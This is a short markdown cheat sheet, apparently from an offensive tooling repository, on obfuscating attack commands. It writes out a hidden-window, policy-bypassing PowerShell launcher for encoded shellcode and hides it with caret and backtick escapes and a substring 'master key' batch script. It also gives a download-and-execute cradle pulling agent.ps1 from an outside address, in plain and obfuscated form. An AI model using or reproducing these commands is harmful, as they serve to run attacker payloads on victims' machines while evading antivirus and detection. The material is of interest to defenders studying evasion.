<br />

# SIMPLE STRING OBFUSCATION TECNICS

<br /><br />

## batch

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch escape caracter** ^<br />

- string obfuscated<br />
`cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode`<br />

---

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />

- using one batch local variable to serve as our **master key** (varObj)

      @echo off
      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
      %varObj:~3,1%%varObj:~12,1%%varObj:~4,1%.exe /c %varObj:~15,1%%varObj:~14,1%%varObj:~26,1%%varObj:~5,1%%varObj:~17,1%%varObj:~18,1%%varObj:~8,1%%varObj:~5,1%%varObj:~11,1%%varObj:~11,1%.exe -nop -%varObj:~26,1%%varObj:~9,1%%varObj:~4,1%%varObj:~4,1%%varObj:~5,1%%varObj:~13,1% -%varObj:~41,1%%varObj:~22,1%%varObj:~5,1%%varObj:~3,1% %varObj:~38,1%%varObj:~25,1%%varObj:~15,1%%varObj:~1,0%%varObj:~18,1%%varObj:~18,1% -noni -%varObj:~5,1%%varObj:~13,1%%varObj:~3,1% $shellcode
      exit


- Description of varObj master_key:<br />
https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md
      

---

<br />

## bash


---

<br />

## powershell

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell escape caracter** `<br />

- string obfuscated<br />
cm\`d.e\`xe /c po\`w\`er\`shel\`l.ex\`e -n\`op -w\`i\`nd h\`idd\`en -Ex\`e\`c B\`yp\`a\`ss -no\`n\`i -en\`c $shellcode<br />

---

- string command to obfuscate<br />
`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
The above string can be obfuscated using **powershell escape caracters** ` and + <br />

- string obfuscated<br />

      $get = New-Object "N\`et\`Web\`Cl\`ie\`nt"
      p\`owe\`r\`shel\`l.exe IEX ($get).D\`ow\`n\`loa\`dSt\`rin\`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')<br />

---

<br />
